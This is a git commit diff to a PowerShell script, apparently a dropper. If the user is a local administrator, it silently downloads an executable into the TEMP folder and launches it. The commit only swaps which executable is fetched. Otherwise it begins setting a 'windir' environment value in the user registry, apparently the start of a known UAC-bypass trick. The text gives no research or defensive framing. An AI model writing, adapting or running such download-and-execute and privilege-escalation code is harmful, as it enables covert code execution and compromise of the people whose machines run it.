3a4b254c23fdb27cac18e7835f0f6cbd790ae5f7
IncsecRishie <155700814+IncsecRishie@users.noreply.github.com>
2024-05-31 13:16:13 +1000

    Update something.ps1

--- something.ps1
+++ something.ps1
@@ -1,7 +1,7 @@
 if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
     # Download and execute the executable file
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/man.exe" -OutFile "$env:TEMP\man.exe"
-    Start-Process "$env:TEMP\man.exe"
+    Invoke-WebRequest -Uri "https://www.battoexeconverter.com/downloads/advbattoexeconverter.exe" -OutFile "$env:TEMP\advbattoexeconverter.exe"
+    Start-Process "$env:TEMP\advbattoexeconverter.exe"
 } else {
     $registryPath = "HKCU:\Environment"
     $Name = "windir"
